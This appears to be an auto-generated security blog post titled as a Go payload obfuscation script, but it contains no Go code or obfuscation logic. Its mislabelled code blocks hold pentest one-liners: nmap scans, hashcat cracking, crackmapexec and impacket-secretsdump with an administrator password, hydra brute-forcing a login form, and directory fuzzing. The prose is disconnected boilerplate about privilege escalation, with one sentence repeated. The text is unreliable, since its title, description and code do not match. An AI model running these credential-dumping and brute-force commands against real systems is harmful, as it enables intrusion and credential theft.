---
TitleSEO: "Payload Obfuscation Script in Go | ZureFX"
TitlePost: "Payload Obfuscation Script — Go"
Author: "ZureFX"
Description: "A Go script for payload obfuscation script. Built for security research and automation."
Keywords: "script, bash, rust, python, fuzzer, go"
URL: "https://zurefx.github.io/scripting/script-payload-obfuscation-script-775.html"
URL_IMAGES: ""
Date: "2025-02-14"
Tags: "Script, Bash, Rust, Python, Fuzzer, Go"
Section: "scripting"
Lang: "en"
main_img: "script-payload-obfuscation-script-775"
Permalink: "/scripting/script-payload-obfuscation-script-775.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `mimikatz`
- `gobuster`
- `secretsdump`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
nmap -sCV -p21,25,443 10.23.2.65 -oN scan.txt
nmap -sCV -p22,23,23 10.123.227.99 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

```go
crackmapexec smb 10.91.203.200 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.105.248.212
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.236.58/FUZZ
gobuster dir -u http://10.40.62.23/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.115.70 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
feroxbuster -h
gobuster dir -u http://10.106.248.128/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 28.78s
```
